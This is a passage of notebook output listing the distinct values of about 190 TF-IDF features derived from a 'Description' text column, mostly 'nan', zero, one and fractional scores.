      "Description_tfidf_4            ['nan', '0.4585060723773579', '0.4427395708543781', '0.6674915868542988', '0.515075549952005', '0.4773364423453646', '0.0', '0.5185325856256374']\n",
      "Description_tfidf_5            ['nan', '0.8127411869179203', '0.521399379033015', '0.6126856115741283', '0.0']\n",
      "Description_tfidf_6            ['nan', '0.6257640715001134', '0.5153276979685751', '0.548990097099721', '0.5108811432553634', '0.4210037043066886', '0.0', '0.6171603338205036']\n",
      "Description_tfidf_7            ['nan', '0.5333125177423647', '0.5328417368714827', '0.4520802017952222', '0.6628876209562093', '0.49047611089514', '0.5384389562801877', '0.5830314343920114', '0.0', '0.3903413069765745']\n",
      "Description_tfidf_8            ['nan', '0.3842091559395605', '0.2956398537455579', '0.3960175987128472', '0.4126810563534582', '0.5521440148915169', '0.6289328856871429', '0.4792872296404745', '0.5517306252123871', '0.5155833496382515']\n",
      "Description_tfidf_9            ['nan', '0.5497924090077502', '0', '0.585107184780177', '0.3752798494116078', '0.491639460678223', '1', '0.6120624957514432', '0.0', '0.4509294478867579']\n",
      "Description_tfidf_10           ['nan', '0', '0.6401459498982549', '0.4884987920362966', '1', '0.0', '0.5677632921878693']\n",
      "Description_tfidf_11           ['nan', '0.4437236514385012', '0', '0.4674589373300332', '0.5255161270817704', '0.6393232121051577', '1', '0.0', '0.4861691828314684', '0.5605809053103845']\n",
      "Description_tfidf_12           ['nan', '0', '0.5456590366026652', '1', '0.5710468462140722', '0.6697159936409462', '0.0']\n",
      "Description_tfidf_13           ['nan', '0.5892191473768976', '0.6604479120943421', '0', '0.5661193974164679', '0.6372732544880758', '1', '0.7471558283891964', '0.0', '0.5195464764607213']\n",
      "Description_tfidf_14           ['nan', '0.5773502691896258', '0.5014231414804187', '0', '0.4694522147096134', '0.5561662167589759', '0.6984468370527279', '1', '0.0', '0.7202693915329765']\n",
      "Description_tfidf_15           ['nan', '0.5712923692404743', '0.823492072100235', '0.4247662011715645', '0.5812066061704612', '0.4631035195201134', '0', '0.5333984248073074', '0.5239558801422358', '0.6947163250247462']\n",
      "Description_tfidf_16           ['0.3853464476060588', 'nan', '0.5165472389076401', '0.4593692822239977', '0', '0.3640635361790006', '0.3752798494116078', '0.2961534152311478', '1', '0.4884721624294524']\n",
      "Description_tfidf_17           ['nan', '0.4245785593254659', '0.3741279389740105', '0.3900714171769143', '0.2333785522678167', '0.2782517304106279', '0.3663535216900201', '0.428388801000449', '0.2679515345941068', '0']\n",
      "Description_tfidf_18           ['nan', '0.7071067811865476', '0.640921012044815', '0', '1', '0.0', '0.7115885211704883']\n",
      "Description_tfidf_19           ['nan', '0.4132325628179641', '0', '0.5051141384850113', '0.6393232121051577', '1', '0.6988721129244404', '0.0']\n",
      "Description_tfidf_20           ['nan', '0', '1.0', '0.5434618925884427', '0.3824463364395223', '1', '0.5554840479285543', '0.5069080401258048', '0.0', '0.4932427637071023']\n",
      "Description_tfidf_21           ['0.3748980118006671', '0.6265199284897868', 'nan', '0.3268778717122076', '0.5748948048258108', '0', '0.6714438741040325', '0.5263313442232653', '0.4792791666332555', '0.3947170194837109']\n",
      "Description_tfidf_22           ['nan', '0', '0.4884987920362966', '0.4813378729927731', '1', '0.7071067811865475', '0.0']\n",
      "Description_tfidf_23           ['nan', '0.3766416296017726', '0', '0.398658622095319', '0.7413016455372313', '0.5737091659125286', '0.6601128659233368', '1', '0.4734848448536292', '0.0']\n",
      "Description_tfidf_24           ['nan', '0', '0.529236687207608', '0.6671131947855915', '1', '0.0', '0.6164769417440593', '0.7766367120294388']\n",
      "Description_tfidf_25           ['nan', '0.4145398777332585', '0', '0.4385405780842603', '0.6936116506890798', '1', '0.0']\n",
      "Description_tfidf_26           ['nan', '0.5169901227431348', '0', '1', '0.0', '0.55569119000457', '0.6333329455891463']\n",
      "Description_tfidf_27           ['nan', '0', '0.52546371066607', '0.748254765600685', '0.3798328870434758', '0.4247574768193027', '0.4385405780842603', '1', '0.5599657183563089', '0.0']\n",
      "Description_tfidf_28           ['nan', '0.6172096026002036', '0.4434025846776733', '0.4819674723169783', '0', '1', '0.0', '0.637629183834905']\n",
      "Description_tfidf_29           ['nan', '0', '0.4800366601532941', '0.4605278220180585', '0.6239373199183876', '1', '0.5910202506202469', '0.0', '0.5990185845595201']\n",
      "Description_tfidf_30           ['0.3748980118006671', 'nan', '0.6672703132638957', '0.5950683495505401', '1', '0.0']\n",
      "Description_tfidf_31           ['nan', '0', '1', '0.5771311381367605', '0.5249976642240116', '0.0', '0.7331816977307669', '0.6804371859562315']\n",
      "Description_tfidf_32           ['nan', '0.683853695534988', '0', '0.5896597328618982', '0.4463571059934882', '0.4817848334537136', '0.0', '0.5697171905577981']\n",
      "Description_tfidf_33           ['nan', '0.518007622807605', '0.734020845334113', '0', '1', '0.0', '0.6297012719126013']\n",
      "Description_tfidf_34           ['nan', '0', '0.543610981521777', '0.6601128659233368', '1', '0.0', '0.542812712028527', '0.3706649876012677']\n",
      "Description_tfidf_35           ['nan', '0.4884232246555598', '0.5694498299458689', '0.7071067811865476', '0', '0.4516087474222652', '0.4834434415179114', '1', '0.0', '0.867581705714783']\n",
      "Description_tfidf_36           ['0.2900825746497509', '0.373501931382683', 'nan', '0.5003308537379221', '0', '0.5831057078309362', '0.5089173846557914', '1', '0.5864479777465605', '0.5933989596640425']\n",
      "Description_tfidf_37           ['nan', '0', '0.4813378729927731', '0.7299253875135759', '0.5333663428941323', '0.0', '0.6642998657045528']\n",
      "Description_tfidf_38           ['nan', '0.2605613160622806', '0', '0.3798328870434758', '0.6843232799469241', '1', '0.703582146639893', '0.0', '0.4030807772714421']\n",
      "Description_tfidf_39           ['0.3818348561475472', '0.4080783347016012', '0.532791190089626', '0.3431165202479523', 'nan', '0.4809330422614796', '0', '0.538323263943507', '1', '0.7141615404240667']\n",
      "Description_tfidf_40           ['nan', '0.7439050464075883', '0', '1', '0.593629507033506', '0.7014399959012456', '0.0']\n",
      "Description_tfidf_41           ['nan', '0.71653143358088', '0', '0.4595475185577499', '1', '0.7071067811865475', '0.0']\n",
      "Description_tfidf_42           ['0.6106443270448328', 'nan', '0.507227512612943', '0.472595150042505', '0', '0.6821676618135762', '1', '0.0']\n",
      "Description_tfidf_43           ['nan', '0.5139626838821042', '0.4646466681050513', '0.6688391170024061', '0.2799629697763788', '0.4366761845670998', '0.369448919523461', '0.44269530066481', '0.4142342736371118', '0.2840829864508293']\n",
      "Description_tfidf_44           ['nan', '0.4819674723169783', '0', '1', '0.4572072399449403', '0.7980467421686849', '0.0', '0.6759324993064144']\n",
      "Description_tfidf_45           ['nan', '0.3392320667244938', '0.6082850056269892', '0.1820926045609875', '0.5865554473593946', '0', '0.4674965796250889', '0.6439264174656747', '0.4506288952159051', '0.7065935183132813']\n",
      "Description_tfidf_46           ['nan', '0.486037668830791', '0.5741642319251277', '0.5949766005381959', '0', '0.5664102619516528', '0.4792872296404745', '0.4254964855170426', '1', '0.3873440124099729']\n",
      "Description_tfidf_47           ['nan', '0.4489975656324425', '0.4644947984155133', '0', '0.8146590038544439', '1', '0.4586071041147215', '0.6321935763574256', '0.5905881342185617', '0.0']\n",
      "Description_tfidf_48           ['nan', '0.6604668030212532', '0.7219040235915849', '0', '0.4759509291613031', '0.5603826657460235', '0.662376112091109', '0.0']\n",
      "Description_tfidf_49           ['nan', '0.1946748925505784', '0.5118221267767021', '0.5062427337730735', '0', '0.4759509291613031', '0.8731135616377588', '0.5356369040456576', '0.703425443927475', '0.5355812565156087']\n",
      "Description_tfidf_50           ['nan', '0', '1', '0.4911251068634023', '0.5272112390652299', '0.0', '0.5240108089882622']\n",
      "Description_tfidf_51           ['nan', '0.5441976040193577', '0', '0.5481619128913525', '1', '0.4157751080009697', '0.0', '0.6695680341276626']\n",
      "Description_tfidf_52           ['nan', '0', '0.4884987920362966', '1', '0.5038354164946025', '0.0', '0.6164769417440593']\n",
      "Description_tfidf_53           ['nan', '0.668745163001914', '0.6492528469043106', '0', '0.5972334955804708', '1', '0.6725593376653183', '0.0', '0.5521049603939315']\n",
      "Description_tfidf_54           ['nan', '0.5629993687768448', '0', '0.6810392786608965', '1', '0.0', '0.7708781884396485']\n",
      "Description_tfidf_55           ['nan', '0.5511654815161414', '0', '0.4689734454822813', '1', '0.8226662654740292', '0.9023776469280178', '0.0', '0.6400527690646546', '0.5337569137826352']\n",
      "Description_tfidf_56           ['nan', '0.6690418936889432', '0.5716053317577002', '0', '1.0', '0.60259555036023', '0.6787425250466279', '0.8339502558744021', '1', '0.0']\n",
      "Description_tfidf_57           ['nan', '0.7084851851833859', '0.6240129776979432', '0.586298357371805', '1', '0.5296471387299279', '0.0', '0.4497143561615609']\n",
      "Description_tfidf_58           ['nan', '0.5093559652282438', '0.5460742257518566', '0.6573519707214066', '0', '1', '0.0', '0.4976413537484114']\n",
      "Description_tfidf_59           ['0.5659624413929195', 'nan', '0.6435898754994692', '0', '0.8831140302626426', '1', '0.0', '0.6458488093493621']\n",
      "Description_tfidf_60           ['nan', '0.646821235107373', '0.6902949986359052', '0.8080098016181241', '0', '0.6376224620939716', '1', '0.0', '0.6547334800797073']\n",
      "Description_tfidf_61           ['nan', '0.4706393363954286', '0', '0.6766277714994662', '0.5055122028181983', '0.0', '0.7174739893594986']\n",
      "Description_tfidf_62           ['nan', '0.7071067811865476', '0', '1', '0.5570902663573792', '0.0', '0.5961007835765133']\n",
      "Description_tfidf_63           ['0.4143733070385075', 'nan', '0.4634328243393127', '0.2049995990204501', '0.2380709713366479', '0.3029104565462137', '0', '0.5039892531436337', '0.1945842679163153', '0.4185496825953544']\n",
      "Description_tfidf_64           ['0.470547661697783', 'nan', '0.7092006666610162', '0', '0.7666135048127231', '1', '0.0']\n",
      "Description_tfidf_65           ['nan', '0.5213918412004918', '0', '0.6965885024620868', '1', '0.5047168256152285', '0.0']\n",
      "Description_tfidf_66           ['nan', '0.5855575856764936', '0.4968193678080845', '0.6800327919392052', '1', '0.5773502691896257', '0.0']\n",
      "Description_tfidf_67           ['nan', '0.69757028244765', '0.592057347778808', '0.6757281988530056', '0.4525940507609635', '1', '0.5284898169914296', '0.0']\n",
      "Description_tfidf_68           ['0.4812335259458739', 'nan', '0', '0.5569917452102434', '0.4603351127352278', '1', '0.0', '0.7084282084501788']\n",
      "Description_tfidf_69           ['0.5930482262108983', 'nan', '0.7789333691050191', '1', '0.0', '0.6701838717838025']\n",
      "Description_tfidf_70           ['nan', '0.588072366672091', '0', '0.6306341780022575', '1', '0.4911251068634023', '0.0']\n",
      "Description_tfidf_71           ['0.4871427449726066', 'nan', '0.3253457269334515', '0.4402664707595354', '0.6118468147438618', '0.4145399414402537', '0.3242785887487373', '0.2255419163371033', '0.2835298350654454', '0.2807479074098713']\n",
      "Description_tfidf_72           ['nan', '0.5630922094932703', '0.4817938506248242', '0', '0.4671113394360779', '0.4930144732621551', '0.6128081295892164', '1', '0.5904211705523521', '0.5839106812901502']\n",
      "Description_tfidf_73           ['nan', '0.4901374895274812', '0.5949766005381959', '0.5136138293399511', '1', '0.4412322846298068', '0.0', '0.6682853297277472', '0.412503816296434']\n",
      "Description_tfidf_74           ['nan', '0.4901374895274812', '0.6933914032923105', '1', '0.0', '0.6171603338205036']\n",
      "Description_tfidf_75           ['nan', '0.4884206568186199', '0.6554957811337759', '0', '0.5638539799962344', '0.0', '0.5409798873343151', '0.533923221119257']\n",
      "Description_tfidf_76           ['nan', '0.6395104883358722', '0', '0.3956412826856548', '0.5203399041228771', '0.746340769687269', '0.5008455467462829', '0.0', '0.551231722108399', '0.4325880010068103']\n",
      "Description_tfidf_77           ['0.7653705456539188', 'nan', '0', '0.646772214840922', '0.593629507033506', '0.0']\n",
      "Description_tfidf_78           ['nan', '0.5331593202655489', '0', '0.4313539102445701', '0.5910202506202469', '0.0']\n",
      "Description_tfidf_79           ['nan', '0.3747963036374578', '0.4239084629207613', '0.2499527247995678', '0.3327810693413051', '0.4964239505283787', '0.4234351212921335', '0.377061525579423', '0.2306512861384304', '0.3205217910302956']\n",
      "Description_tfidf_80           ['nan', '0.7625098633062068', '0', '0.0', '0.7331611650971267', '0.4213343693123426']\n",
      "Description_tfidf_81           ['0.5377059719641689', 'nan', '0', '0.4260731025970247', '0.4340835098137643', '0.0', '0.758560680213075']\n",
      "Description_tfidf_82           ['nan', '0.5071591461765975', '0.6206402622081949', '1', '0.4580782786012253', '0.6540075806418985', '0.4213046510973805', '0.0', '0.6787372301525905', '0.6586317016729233']\n",
      "Description_tfidf_83           ['nan', '0.6828613867194314', '0.5215968087281899', '1', '0.6047721279392207', '0.0']\n",
      "Description_tfidf_84           ['nan', '0.5372392188851637', '0.4034995586867435', '1', '0.5905881342185617', '0.0', '0.507248564491665']\n",
      "Description_tfidf_85           ['nan', '0.5930194656161956', '0.7071067811865476', '0.6498401276660668', '0.6635889480072107', '0.5007584273769429', '1', '0.6271066946658312', '0.0']\n",
      "Description_tfidf_86           ['0.4985310246431183', 'nan', '0.3997589528756219', '0.4606443381687834', '0.5770800505087426', '0.5615765688915337', '0.3763634801680944', '0.3208425606289203', '0.5466835095868391', '0.4166331401563571']\n",
      "Description_tfidf_87           ['nan', '0.6201635816580106', '0.4159125744121961', '0.5796773541097503', '1', '0.0']\n",
      "Description_tfidf_88           ['nan', '0.5122889331134168', '0.6746097299519618', '0.506602224475044', '0.5', '1', '0.0', '0.5530280768943723']\n",
      "Description_tfidf_89           ['nan', '0', '0.4495971158087671', '1', '0.5340523951861901', '0.0', '0.4533388872077119', '0.6781230097748451']\n",
      "Description_tfidf_90           ['nan', '0.5773502691896258', '0', '0.6655640130765897', '1.0', '0.883892872467676', '1', '0.552848616466464', '0.0', '0.6173739078370535']\n",
      "Description_tfidf_91           ['nan', '0.4712105529179619', '0.4685189841181721', '0', '0.3820605126385363', '0.2535795730882987', '1', '0.3641659829558564', '0.0', '0.5734919468666645']\n",
      "Description_tfidf_92           ['0.7193308261508712', 'nan', '0.5790004211609039', '0.9292781398050132', '0', '1', '0.0']\n",
      "Description_tfidf_93           ['0.516861319352989', '0.470547661697783', 'nan', '0', '0.5504551341935163', '1', '0.6139196162938377', '0.0', '0.3603175086678624', '0.9373280701881782']\n",
      "Description_tfidf_94           ['nan', '0.6763114612141804', '0', '0.253301112237522', '1', '0.0', '0.4213343693123426']\n",
      "Description_tfidf_95           ['0.4871427449726066', 'nan', '0.5155219282881223', '0', '0.4884362457718121', '0.7009771553570072', '1', '0.5331593202655489', '0.0']\n",
      "Description_tfidf_96           ['0.4514667673210695', 'nan', '0.3113765441408527', '0.3829878741610654', '0.5529286939288685', '0.7834556811658903', '0.4266443316178993', '0.4040353692789096', '0.332874019536151', '0.4005881863434113']\n",
      "Description_tfidf_97           ['nan', '0.5773502691896258', '0', '0.5495734347865395', '1', '0.0', '0.5685686690457904']\n",
      "Description_tfidf_98           ['0.4551322219436957', 'nan', '0.3210130924001801', '0.4253926454485611', '0.2417556032430733', '0.3159961460228203', '0.6823682344260206', '0.4377987569896518', '0.2865002629559808', '0.4801737067633056']\n",
      "Description_tfidf_99           ['nan', '0.6022041804298619', '0', '0.8237990216724829', '1', '0.7490826892862888', '0.0', '0.7457705827679654']\n",
      "Description_tfidf_100          ['nan', '0.4822366905221495', '0', '0.5004067981416687', '1', '0.493955708383491', '0.9236316972070432', '0.5272112390652299', '0.0', '0.5444549561813438']\n",
      "Description_tfidf_101          ['nan', '0', '0.5994346163196572', '0.4628218403461832', '1', '0.4714953309243392', '0.6017449347590296', '0.0', '0.5546277066755011']\n",
      "Description_tfidf_102          ['nan', '0.6554957811337759', '0', '0.4145398777332585', '0.5578183693511427', '1', '0.0', '0.533923221119257']\n",
      "Description_tfidf_103          ['nan', '0.4145398777332585', '0', '1', '0.7162003164547865', '0.0', '0.6057780318131011']\n",
      "Description_tfidf_104          ['nan', '0', '1', '0.6047721279392207', '0.0', '0.6108109928733585', '0.8974887267028947', '0.5238058098200384']\n",
      "Description_tfidf_105          ['nan', '0.5362808260694585', '0', '0.520386532059638', '1', '0.0', '0.4994125558039584']\n",
      "Description_tfidf_106          ['0.4860453877851432', 'nan', '0.5497924090077502', '0', '0.585107184780177', '0.491639460678223', '0.5026975319004563', '1', '0.0', '0.4509294478867579']\n",
      "Description_tfidf_107          ['0.4689537839688009', 'nan', '0.5333125177423647', '0', '1.0', '0.4520802017952222', '0.49047611089514', '0.5830314343920114', '0.0']\n",
      "Description_tfidf_108          ['nan', '0.7432246931373531', '0', '0.4674606259930389', '0.6562738315737734', '1', '0.0', '0.6427072189011547', '0.663248271563258']\n",
      "Description_tfidf_109          ['nan', '0.379355531491973', '0.6303424875335336', '0', '0.5700744556109478', '0.5257275339754028', '0.4092041476032982', '1', '0.6499703376250551', '0.5853278581186502']\n",
      "Description_tfidf_110          ['nan', '0.5183157819786135', '0', '0.4759509291613031', '0.6137770259134999', '0.5209741576808326', '1', '0.0']\n",
      "Description_tfidf_111          ['nan', '0.4354879844132672', '0.3298554701727295', '0.4231473543333982', '0.2764483737242584', '0.4373885966531686', '0.4509521656128435', '0.4031987065495782', '0.2797883579279218', '0.4766450481588797']\n",
      "Description_tfidf_112          ['nan', '0.3183040741849848', '0.2735138666128741', '0.3009835608163168', '0.3465265248470355', '0.3709024925683916', '0.3690985438852399', '0.3663046829919407', '0.3362149757594967', '0.5047168256152285']\n",
      "Description_tfidf_113          ['nan', '0', '1.0', '1', '0.0', '0.6199438873140677', '0.8332485310519785']\n",
      "Description_tfidf_114          ['nan', '0.5418702197942611', '0.588774389269018', '1', '0.5557148073311955', '0.0', '0.466504263116188']\n",
      "Description_tfidf_115          ['nan', '0.4489975656324425', '0.5515110139471893', '0.4720213393260649', '0', '0.6783121402194421', '0.4450526386097449', '1', '0.0']\n",
      "Description_tfidf_116          ['nan', '0.4159125744121961', '0', '0.6540250638656032', '1', '0.6476715491899186', '0.0']\n",
      "Description_tfidf_117          ['nan', '0', '0.6118468147438618', '1', '0.5047168256152285', '0.0', '0.6889288525283793', '0.418616582662108']\n",
      "Description_tfidf_118          ['nan', '0.5362808260694585', '0', '1', '0.6749221599828176', '0.0', '0.9263478819632962']\n",
      "Description_tfidf_119          ['nan', '0.5197646144677307', '0.4654883933303357', '0.4196904244673095', '1', '0.0', '0.4547796386993037']\n",
      "Description_tfidf_120          ['0.6621409752377521', 'nan', '0.7095174554321941', '0', '0.651690050783449', '0.5502919487880338', '1', '0.0']\n",
      "Description_tfidf_121          ['nan', '0.5594357735555924', '0.681671060875277', '0.5571376833421978', '0', '0.4861505019708083', '0.4811116986056604', '0.5243879277391507', '1', '0.625981217324815']\n",
      "Description_tfidf_122          ['0.5029436257964515', 'nan', '0', '0.5411133881605372', '0.6996554801709615', '1', '0.0', '0.5698482991772355', '0.8952474182498285', '0.5372665547940484']\n",
      "Description_tfidf_123          ['0.662477498438109', 'nan', '0.5215280328944654', '0', '0.5079126432016501', '0.3601580014638779', '1', '0.0', '0.7866698531925609', '0.4374131680940927']\n",
      "Description_tfidf_124          ['0.3057432139061377', 'nan', '0.8187401509501219', '0.7314666091756619', '0.4170822661243193', '0', '0.2921101794974576', '0.4153114636699185', '1', '0.4560431548952539']\n",
      "Description_tfidf_125          ['nan', '0', '0.4948868510490299', '0.5578183693511427', '0.7006421684393376', '0.654666502127111', '1', '0.0']\n",
      "Description_tfidf_126          ['nan', '0.4422626053926241', '0', '0.3428342894616185', '0.253301112237522', '0.2535795730882987', '1', '0.4228312786914046', '0.0']\n",
      "Description_tfidf_127          ['nan', '0.5084803400646272', '0', '0.6365951057746507', '1', '0.655440866011633', '0.0', '0.3399337282409029']\n",
      "Description_tfidf_128          ['0.5470220627519693', '0.4585636484583267', 'nan', '0', '1', '0.8375095381906951', '0.0', '0.5062706955749297', '0.4432186059705306']\n",
      "Description_tfidf_129          ['nan', '0', '0.3752798494116078', '0.253301112237522', '0.2535795730882987', '1', '0.0']\n",
      "Description_tfidf_130          ['nan', '0', '0.696555754681794', '0.6828227016637225', '0.6608997677082138', '0.4603351127352278', '1', '0.4287310431654141', '0.0', '0.5216917813268229']\n",
      "Description_tfidf_131          ['nan', '0.604621130633912', '0', '0.6607887774416801', '0.6369825889206124', '1', '0.5767266933614295', '0.49522611212143', '0.0', '0.5604683739280016']\n",
      "Description_tfidf_132          ['0.5039519775169768', 'nan', '0.4482785955241766', '0', '0.5458968702046357', '0.3864174660405167', '0.4587327654268363', '0.5257028464917556', '0.4276102194760313', '1']\n",
      "Description_tfidf_133          ['0.662477498438109', 'nan', '0', '0.8378523778690272', '1', '0.0', '0.6648733841720318']\n",
      "Description_tfidf_134          ['nan', '0', '0.4654883933303357', '0.612911045873575', '0.515075549952005', '1', '0.6742667918409633', '0.0']\n",
      "Description_tfidf_135          ['nan', '0.7268564467352577', '0', '0.5406438680560445', '0.439934567608808', '1', '0.7057256849340708', '0.0', '0.4004874926484366', '0.5025300536121647']\n",
      "Description_tfidf_136          ['0.519700380844155', 'nan', '0.7828748398539183', '0.372386482745387', '0', '0.6646489058924671', '1', '0.0', '0.4951601927854495', '0.6687934259534232']\n",
      "Description_tfidf_137          ['nan', '0.7094133472934444', '0', '1', '0.5773502691896257', '0.0', '0.4219339103145202', '0.6456206755134697']\n",
      "Description_tfidf_138          ['0.6106443270448328', 'nan', '0.7050066768531844', '0.5608037171250414', '0', '0.6542591754563409', '0.5421908281334084', '1', '0.4916970111100161', '0.0']\n",
      "Description_tfidf_139          ['nan', '0.6212171112599644', '0.4461587782442336', '0.4416526807721084', '0', '1', '0.0', '0.542812712028527', '0.5990185845595201']\n",
      "Description_tfidf_140          ['nan', '0.5195780317930575', '0.757526431484054', '0', '0.5417931498592425', '1', '0.5343550150249775', '0.0', '0.637629183834905']\n",
      "Description_tfidf_141          ['nan', '0.5420247409139809', '0', '0.4313539102445701', '0.395182531110744', '1', '0.5608187951228312', '0.7267610029489184', '0.0', '0.4829062585875363']\n",
      "Description_tfidf_142          ['nan', '0.4869953351774719', '0.6726363158130861', '0.4275525890772567', '0.527266075288422', '0.4254361994035965', '0.5464227058236221', '0.4026886000595908', '0.3662131405556519', '0.4680033445223947']\n",
      "Description_tfidf_143          ['0.4473404165301243', '0.5865689786111931', 'nan', '0.5171332735459484', '0.5960770238061994', '0.3430346400996394', '0', '0.5685245954670863', '0.6571051969132076', '0.3640135696731378']\n",
      "Description_tfidf_144          ['nan', '0', '0.6439264174656747', '0.4152948052745288', '0.2535795730882987', '1', '0.0']\n",
      "Description_tfidf_145          ['nan', '0.4350282331947164', '0.6926035869840521', '0', '1', '0.5449319319215461', '0.4543671451018019', '0.0', '0.6369155883014778']\n",
      "Description_tfidf_146          ['nan', '0.4603918027656825', '0.3616781977755499', '0.3045461373608649', '0.292066784513647', '0.4011302833716393', '0.2278727231366678', '0.4092288384702933', '0.2293199751000225', '0.4856377436160225']\n",
      "Description_tfidf_147          ['0.3752421366619351', 'nan', '0.4814489787458587', '0.6631973455303195', '0', '0.7046878602878186', '0.4322708038302678', '0.4877715119423434', '1', '0.4342828964068199']\n",
      "Description_tfidf_148          ['0.4496313647552313', 'nan', '0.3594371095764468', '0.5839913252718264', '0.4487672943756808', '0', '1.0', '0.4883893643896363', '0.6026667802367994', '0.5089173846557914']\n",
      "Description_tfidf_149          ['nan', '0.8271620749173241', '0', '0.6087817024078216', '0.253301112237522', '1', '0.6100238756893038', '0.0', '0.6434685374744034']\n",
      "Description_tfidf_150          ['nan', '0.4600210314893848', '0.381096916783923', '0.2643353178685718', '0.2776458008356374', '0.3090867768611889', '0.3363875489640106', '0.4685363681553801', '0.3566275827071849', '0.362475598551166']\n",
      "Description_tfidf_151          ['nan', '0.6115702134910925', '0.3597229046297981', '0.5782940874564725', '0.3294707566741875', '0.3620251971355322', '0', '0.4837208131658541', '0.5696084760730677', '1.0']\n",
      "Description_tfidf_152          ['nan', '0', '0.8871642056858166', '0.6463853345076643', '0.7794054010623436', '1', '0.0', '0.5414805695480968']\n",
      "Description_tfidf_153          ['0.5384095243074842', 'nan', '0', '0.4283612262682368', '0.3752798494116078', '1', '0.5809543466505298', '0.0', '0.4574601815285485']\n",
      "Description_tfidf_154          ['0.5377059719641689', 'nan', '0.6491496126799701', '0', '0.6727887902754599', '0.0']\n",
      "Description_tfidf_155          ['0.5747716856548464', 'nan', '0.7564879936013067', '0.4811116986056604', '1', '0.0', '0.5521049603939315']\n",
      "Description_tfidf_156          ['nan', '0.5272579156190573', '0.5131861378434313', '0.6766681356210765', '1', '0.0', '0.5617601587153284']\n",
      "Description_tfidf_157          ['nan', '0.5240816972558455', '0', '0.4880842598538999', '0.6233718500400733', '0.4917861493259065', '0.5872481617436783', '0.3425236651665537', '0.0', '0.6411478921620187']\n",
      "Description_tfidf_158          ['nan', '0.5958537951376588', '0', '1.0', '0.5837530937618371', '0.0']\n",
      "Description_tfidf_159          ['nan', '0.7600709233189691', '0.6672703132638957', '0', '0.0', '0.5100704887358115']\n",
      "Description_tfidf_160          ['nan', '0.7480973921106018', '0', '0.5918383391459604', '0.4152951508051375', '0.0', '0.4214067553059122']\n",
      "Description_tfidf_161          ['nan', '0.915112453765518', '0.5171611536333274', '0.4901374895274812', '0.4521120208223558', '0', '0.5458000068647507', '0.5283593528531839', '0.0']\n",
      "Description_tfidf_162          ['nan', '0.5958537951376588', '0.4517748375546952', '0.7138253450272691', '0.4869422616839627', '0', '0.393032546369171', '0.5119857575653185', '0.5986811967875456', '0.0']\n",
      "Description_tfidf_163          ['nan', '0.8462467416556947', '0.5206849388850623', '0.588072366672091', '0', '0.7695253234389908', '0.451883837140878', '0.3886854707338483', '0.0']\n",
      "Description_tfidf_164          ['nan', '0.6018175564242267', '0.5197646144677307', '1', '0.7071067811865475', '0.0', '0.652804492633924']\n",
      "Description_tfidf_165          ['0.6381182262071552', 'nan', '1.0', '0.5310238326782559', '0.550635769985682', '1', '0.0']\n",
      "Description_tfidf_166          ['0.5573759765564846', 'nan', '0.4790319254223074', '0.646821235107373', '0.4474339342465525', '0.5950250189335003', '0.5292676627664524', '1', '0.0', '0.6221792226711703']\n",
      "Description_tfidf_167          ['nan', '0.4639846575912259', '0.4318376368820039', '0.4824439723177599', '0.5403755079794273', '0.7434233603271174', '0.9235457682180632', '0.4671113394360779', '1.0', '1']\n",
      "Description_tfidf_168          ['nan', '0.6657755823203853', '0.511799211403992', '0.9160210127296144', '1', '0.0', '0.7523449979288711', '0.651602405178708', '0.6675557248856938', '0.6951434938131509']\n",
      "Description_tfidf_169          ['nan', '0.5976061977137549', '1', '0.8741482269929389', '0.0', '0.4219339103145202']\n",
      "Description_tfidf_170          ['nan', '0.4177695708665724', '0.5773502691896258', '0.4183126309382307', '0.5502919487880338', '1', '0.0']\n",
      "Description_tfidf_171          ['nan', '0.8877158261212678', '0', '1.0', '0.6236224243048453', '1', '0.0', '0.6333329455891463', '0.44216897416315']\n",
      "Description_tfidf_172          ['nan', '0.4815075347693968', '0', '0.8973597084698413', '0.4813378729927731', '1', '0.6029450463070046', '0.0', '0.4213343693123426']\n",
      "Description_tfidf_173          ['nan', '0.6996146344691101', '0.7836385012732752', '0.4819674723169783', '0', '1', '0.0', '0.4213343693123426']\n",
      "Description_tfidf_174          ['0.6753334408527002', 'nan', '0', '0.770933546668312', '0.2535795730882987', '1', '0.7107032238208265', '0.0']\n",
      "Description_tfidf_175          ['nan', '0', '0.3752798494116078', '0.253301112237522', '0.5', '1', '0.0']\n",
      "Description_tfidf_176          ['0.4270335176652616', 'nan', '0.5231602988743058', '0', '0.4451671679326945', '0.5926823067668152', '0.3238112900212232', '1', '0.0', '0.6283168985169216']\n",
      "Description_tfidf_177          ['nan', '0.518007622807605', '0', '0.6821676618135762', '1', '0.0', '0.5906701955420494']\n",
      "Description_tfidf_178          ['nan', '0.4877081095691946', '0.5272579156190573', '0', '1', '0.0', '0.5100704887358115']\n",
      "Description_tfidf_179          ['nan', '0.5056942464614264', '0', '0.4902937255630866', '0.6177835765569418', '0.6958076552252636', '1', '0.7071067811865475', '0.0', '0.6157026503466908']\n",
      "Description_tfidf_180          ['nan', '0', '0.4942077061304762', '0.5918383391459604', '0.464971926014355', '1', '0.0', '0.4359098230287983']\n",
      "Description_tfidf_181          ['nan', '0.8934167118823836', '0', '1', '0.5202904054360185', '0.0', '0.4490824512751361', '0.6648733841720318', '0.6687934259534232']\n",
      "Description_tfidf_182          ['nan', '0', '0.5192869060137021', '0.6401459498982549', '0.5773502691896257', '1', '0.0']\n",
      "Description_tfidf_183          ['nan', '0.5211977842249752', '0.6077697690585501', '0.5645166331436621', '0', '0.3879264740645474', '0.4603351127352278', '1', '0.0']\n",
      "Description_tfidf_184          ['nan', '0.6205877295939102', '0.931152519589867', '0', '0.516906304604206', '1', '0.3751418324037109', '0.5256809690795877', '0.0']\n",
      "Description_tfidf_185          ['nan', '0', '0.654472119912157', '1', '0.0', '0.4994125558039584', '0.6222542259769609']\n",
      "Description_tfidf_186          ['nan', '0.7387320591654515', '0', '0.8905351435578754', '0.5570902663573792', '1', '0.0']\n",
      "Description_tfidf_187          ['nan', '0', '1.0', '0.682383941696141', '0.5', '1', '0.0']\n",
      "Description_tfidf_188          ['nan', '0', '0.4833368933821587', '0.3844786103479002', '0.4272372419711173', '0.3017696137978412', '0.5056089537831611', '0.6611497477766993', '1', '0.5333663428941323']\n",
      "Description_tfidf_189          ['0.2338845027839987', 'nan', '0.4645058509207245', '0.3618890488184624', '0.4603351127352278', '0.294868955444193', '0.3872010642453069', '0.3852294639822507', '0.4442978192087301', '0.3376536142101319']\n",
      "Description_tfidf_190          ['nan', '0', '1.0', '0.4525940507609635', '0.5740357345941031', '1', '0.5284898169914296', '0.0', '0.5726677311186987']\n",
